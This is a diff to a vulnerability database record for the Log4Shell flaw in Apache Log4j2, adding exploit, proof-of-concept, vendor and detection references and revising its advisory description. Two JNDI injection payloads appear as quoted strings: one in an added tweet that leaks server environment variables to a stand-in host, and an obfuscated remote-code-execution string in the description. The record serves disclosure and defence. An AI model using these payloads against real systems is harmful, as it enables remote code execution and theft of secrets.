@@ -957,12 +957,73 @@
         "refsource": "DETECTION",
         "name": "https://blog.silentsignal.eu/2021/12/12/our-new-tool-for-enumerating-hidden-log4shell-affected-hosts/",
         "url": "https://blog.silentsignal.eu/2021/12/12/our-new-tool-for-enumerating-hidden-log4shell-affected-hosts/"
+      },
+      {
+        "refsource": "EXPLOIT",
+        "name": "https://twitter.com/_StaticFlow_/status/1469358229767475205",
+        "url": "In case anyone hasn't discovered this. The Log4J formatting is nestable which means payloads like \"${jndi:ldap://${env:user}.xyz.collab.com/a}\" Will leak server side env vars!",
+        "timestamp": "2021-12-10T18:27"
+      },
+      {
+        "refsource": "VENDOR",
+        "name": "Panorama 10.1 OSS Listing",
+        "url": "https://docs.paloaltonetworks.com/oss-listings/panorama-oss-listings/panorama-10-1-open-source-software-oss-listing.html"
+      },
+      {
+        "refsource": "VENDOR",
+        "name": "UniFi Network Application 6.5.54",
+        "url": "https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1"
+      },
+      {
+        "refsource": "VENDOR",
+        "name": "https://twitter.com/tnpitsecurity/status/1469429810216771589",
+        "url": "e can confirm that VMWare vCenter is affected by the Log4j vulnerability. #log4j #vcenter #Log4Shell",
+        "timestamp": "2021-12-10T11:12"
+      },
+      {
+        "refsource": "PROOFOFCONCEPT",
+        "name": "https://github.com/xiajun325/apache-log4j-rce-poc",
+        "url": "https://github.com/xiajun325/apache-log4j-rce-poc"
+      },
+      {
+        "refsource": "DETECTION",
+        "name": "https://www.reddit.com/r/crowdstrike/comments/rda0ls/20211210_cool_query_friday_hunting_apache_log4j/",
+        "url": "https://www.reddit.com/r/crowdstrike/comments/rda0ls/20211210_cool_query_friday_hunting_apache_log4j/"
+      },
+      {
+        "refsource": "DETECTION",
+        "name": "https://github.com/PortSwigger/active-scan-plus-plus/commit/b485a0744140533d877ce244603502b42f9c6656",
+        "url": "https://github.com/PortSwigger/active-scan-plus-plus/commit/b485a0744140533d877ce244603502b42f9c6656"
+      },
+      {
+        "refsource": "DETECTION",
+        "name": "https://twitter.com/beyang/status/1469171471784329219",
+        "url": "https://twitter.com/beyang/status/1469171471784329219",
+        "content": "You can run these queries on @sourcegraph to determine the scope of impact of the log4j 0-day on your code:"
+      },
+      {
+        "refsource": "DETECTION",
+        "name": "https://semgrep.dev/r?q=log4j-message-lookup-injection",
+        "url": "https://semgrep.dev/r?q=log4j-message-lookup-injection"
+      },
+      {
+        "refsource": "CONFIRMATION",
+        "name": "https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j",
+        "url": "https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j"
+      },
+      {
+        "refsource": "CONFIRMATION",
+        "name": "https://www.reddit.com/r/netsec/comments/rcwws9/rce_0day_exploit_found_in_log4j_a_popular_java/",
+        "url": "https://www.reddit.com/r/netsec/comments/rcwws9/rce_0day_exploit_found_in_log4j_a_popular_java/"
       }
+      
+      
+      
     ],
     "reporter": "kurtseifried",
     "reporter_id": 582211,
     "notes": "",
-    "description": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints resulting in remote code execution against a wide variety of Java applications (e.g. anything logging user controlled strings such as web browser user agents, to chat functionality in Minecraft servers). An attacker who can inject information into a log message or log message parameter can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled (e.g. a user agent string substitution). From log4j 2.15.0 and later, this behavior has been disabled by default. In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to \"true\" or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Please note the CVE originally stated that Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\" but that this data was silently removed later and it appears it may not offer the protection previously stated. \n\n Remote code execution is trivially possible, e.g. \"${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}\". Exploits have been published on Twitter, Lunasec and GitHub including working exploits for Minecraft Servers (via the chat functionality). It is also reported that many large cloudd services and applications are affected (e.g. Apple, Tencent, Twitter, Steam, Amazon, etc. see the \"Log4jAttackSurface\" GitHub repo for additional information). CISA has also officially added this issue to their \"KNOWN EXPLOITED VULNERABILITIES CATALOG\". CloudFlare has stated that they are now blocking this attack by default in their WAF rules and are looking to roll out protection for free customers as well. An unverified \"Log4jPatch\" hotfix that can be used to inject a Java agent into a running JVM process has been released as well (please ensure you audit the code before deploying). Exploitation detection rules and code has been released by Neo23x0 in GitHub gist e4c8b03ff8cdf1fa63b7d15db6e3860b. Snort and Suricata signatures have been released as well via emergingthreatspro. Please see the references links in the GSD data section for more information on these workarounds, exploits, signatures, etc. It has been reported that JDK versions greater than 6u211, 7u201, 8u191, and 11.0.1 are not affected by the LDAP attack vector. In these versions com.sun.jndi.ldap.object.trustURLCodebase is set to false meaning JNDI cannot load remote code using LDAP (see Lunasec blog entry)."
+    "description": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints resulting in remote code execution against a wide variety of Java applications (e.g. anything logging user controlled strings such as web browser user agents, to chat functionality in Minecraft servers). An attacker who can inject information into a log message or log message parameter can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled (e.g. a user agent string substitution). From log4j 2.15.0 and later, this behavior has been disabled by default. In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to \"true\" or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Please note the CVE originally stated that Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\" but that this data was silently removed later and it appears it may not offer the protection previously stated. \n\n Remote code execution is trivially possible, e.g. \"${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}\". Exploits have been published on Twitter, Lunasec and GitHub including working exploits for Minecraft Servers (via the chat functionality). It is also reported that many large cloudd services and applications are affected (e.g. Apple, Tencent, Twitter, Steam, Amazon, etc. see the \"Log4jAttackSurface\" GitHub repo for additional information). CISA has also officially added this issue to their \"KNOWN EXPLOITED VULNERABILITIES CATALOG\". CloudFlare has stated that they are now blocking this attack by default in their WAF rules and are looking to roll out protection for free customers as well. An unverified \"Log4jPatch\" hotfix that can be used to inject a Java agent into a running JVM process has been released as well (please ensure you audit the code before deploying). Exploitation detection rules and strategies have been released, Snort and Suricata signatures have been released as well via emergingthreatspro. Please see the references links in the GSD data section for more information on these workarounds, exploits, signatures, etc. It has been reported that JDK versions greater than 6u211, 7u201, 8u191, and 11.0.1 are not affected by the LDAP attack vector. In these versions com.sun.jndi.ldap.object.trustURLCodebase is set to false meaning JNDI cannot load remote code using LDAP (see Lunasec blog entry)."
   },
   "cve.org": {
     "CVE_data_meta": {
